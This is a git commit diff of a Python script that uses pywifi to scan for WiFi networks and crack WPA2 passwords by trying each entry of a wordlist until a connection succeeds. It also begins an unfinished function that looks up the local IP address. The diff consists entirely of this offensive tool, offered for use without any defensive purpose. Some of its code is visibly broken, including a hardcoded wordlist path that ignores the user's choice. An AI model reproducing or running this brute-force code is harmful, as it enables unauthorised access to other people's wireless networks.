f27f7763dc47cf21fd80229366807d2dafc282ee
mohamed <mohamedhathim628@gmail.com>
2025-07-28 20:57:17 +0530

    2nd feature while implemented

--- main.py
+++ main.py
@@ -1,8 +1,8 @@
-import socket as skt
+from socket import *
 import pywifi
 from time import sleep
 from os import system
-import sys
+import ipaddress
 
 system('clear')
 
@@ -14,44 +14,50 @@ def print_dashboard():
     '''
     print(dashboard)
 
-def connect(network_info_obj,password,iface):
+def connect(ssid,iface,auth='LOCK',password=''):
     device = pywifi.Profile()
-    device.ssid = network_info_obj[0]
+    device.ssid = ssid 
     device.auth = pywifi.const.AUTH_ALG_OPEN
-    device.akm.append(pywifi.const.AKM_TYPE_WPA2PSK) if network_info_obj[1] == 'LOCK' else device.akm.append(pywifi.const.AKM_TYPE_NONE)
-    device.cipher = pywifi.const.CIPHER_TYPE_CCMP if network_info_obj[1] == 'LOCK' else pywifi.const.CIPHER_TYPE_NONE
+    device.akm.clear()
 
-    if network_info_obj[1] == 'LOCK':
-        device.key = password
-        iface.remove_all_network_profiles()
-        tmp_profile = iface.add_network_profile(device)
-        iface.connect(tmp_profile)
-        sleep(3)
+    if auth == 'LOCK':
+        device.key = password.strip('\n')
+        device.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
+        device.cipher = pywifi.const.CIPHER_TYPE_CCMP
 
-        if iface.status() == pywifi.const.IFACE_CONNECTED:
-            system('clear')
-            print(f"Connected! password found : {password}")
-            sys.exit()
     else:
-        iface.remove_all_network_profiles()
-        tmp_profile = iface.add_network_profile(device)
-        iface.connect(tmp_profile)
-        sleep(3)
-        if iface.status() == pywifi.const.IFACE_CONNECTED:
-            system('clear')
-            print(f"Connected! password found : {password}")
-            sys.exit()
+        device.akm.append(pywifi.const.AKM_TYPE_NONE)
+        device.cipher = pywifi.const.CIPHER_TYPE_NONE
+
+    iface.remove_all_network_profiles()
+    tmp_profile = iface.add_network_profile(device)
+    iface.connect(tmp_profile)
+    sleep(7)
+    if iface.status() == pywifi.const.IFACE_CONNECTED:
+        return True
+    return False
+
+def launch_bruteforce(ssid,path,iface,auth):
+    with open(path,'r') as wordlist:
+        passes = wordlist.readlines()
+        for bf in passes:
+            if connect(ssid,iface,auth,bf):
+                return bf
+    wordlist.close()
+    return None
 
 def wifi_bruteforce():
     availables = []
     init = pywifi.PyWiFi()
     interface = init.interfaces()[0]
+    
     interface.scan()
     sleep(2)
     networks = interface.scan_results()
 
     if len(networks) == 0:
         print("No device found")
+        return
 
     for network in networks:
         availables.append((network.ssid,'OPEN' if len(network.akm) == 0 else 'LOCK'))
@@ -61,14 +67,61 @@ def wifi_bruteforce():
 
     while True:
         target = input('Enter the target wifi name : ').strip()
-        if target in availables:
-            name,auth = target
-            if auth == 'OPEN':
+        selected_auth = None
+        for name, auth in availables:
+            if target == name:
+                selected_auth = auth
+                break
 
-        else:
+        if selected_auth == 'OPEN':
+            if connect(target,interface,selected_auth):
+                print(f'target \'{name}\' is connected successfully!')
+            else:
+                print(f'target \'{name}\' is connected failed!')
+
+        if not selected_auth:
             system('clear')
             print(f'Invalid wifi name : {target}')
             continue
+        
+        elif selected_auth == 'LOCK':
+            system('clear')
+            print('Wordlist type:\n')
+            print('1.Numbers\n2.Alphabates(including all language)\n3.Combo(Like username)\n4.Custom wordlist'.strip())
+            wordlist_type = int(input('Enter wordlist type : '))
+            path = None
+            if wordlist_type == 1:
+                path = 'wordlist/numbers.txt'
+            elif wordlist_type == 2:
+                path = 'wordlist/alphabets.txt'
+            elif wordlist_type == 3:
+                path = 'wordlist/combo.txt'
+            elif wordlist_type == 4:
+                pass
+            password = launch_bruteforce(target,'wordlist/alphabets.txt',interface,selected_auth)
+            if password == None:
+                print('password is not in wordlist')
+            else:
+                system('clear')
+                print(f'SSID : {name}\npassword found : {password}')
+                break
 
-wifi_bruteforce()
+def pretending_wifi():
+    wifi_info = dict()
+    init = pywifi.PyWiFi()
+    interface = init.interfaces()[0]
+    status = interface.status()
+
+    sock = socket(AF_INET,SOCK_DGRAM)
+    sock.connect(('8.8.8.8',80))
+    getip = sock.getsockname()[0]
+
+    if status == pywifi.const.IFACE_CONNECTED:
+        profile = interface.network_profiles()
+        for _profile in profile:
+            wifi_info.update({'SSID':_profile.ssid,'IP':getip})
+
+    ip_init = ipaddress.ip_network(getip,strict=False)
+
+pretending_wifi()
             
